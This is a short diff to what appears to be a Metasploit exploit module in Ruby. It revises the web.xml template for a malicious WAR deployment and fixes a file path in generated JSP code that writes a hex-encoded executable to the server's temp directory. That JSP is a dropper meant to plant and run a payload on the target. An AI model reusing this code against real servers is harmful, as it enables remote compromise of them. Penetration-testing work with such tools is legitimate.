@@ -604,19 +604,17 @@ require 'metasm'
 		# end web-inf/
 
 		# begin web-inf/web.xml
-		webxmlraw = %q{<?xml version="1.0" ?>
-<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
-http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
-version="2.4">
-<servlet>
-<servlet-name>NAME</servlet-name>
-<jsp-file>/PAYLOAD.jsp</jsp-file>
-</servlet>
+		webxmlraw = %q{<?xml version="1.0"?>
+<!DOCTYPE web-app PUBLIC
+ "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
+ "http://java.sun.com/dtds/web-app_2_3.dtd">
+<web-app>
+ <servlet>
+  <servlet-name>NAME</servlet-name>
+  <jsp-file>/PAYLOAD.jsp</jsp-file>
+ </servlet>
 </web-app>
 }
-
 		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
 		webxmlraw.gsub!(/NAME/, var_name)
 		webxmlraw.gsub!(/PAYLOAD/, jsp_name)
@@ -643,7 +641,7 @@ version="2.4">
 
 		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
 		jspraw << "<%\n"
-		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"#{var_hexfile}.txt\";\n"
+		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"/#{var_hexfile}.txt\";\n"
 		jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
 		jspraw << "String #{var_data} = \"\";\n"
 
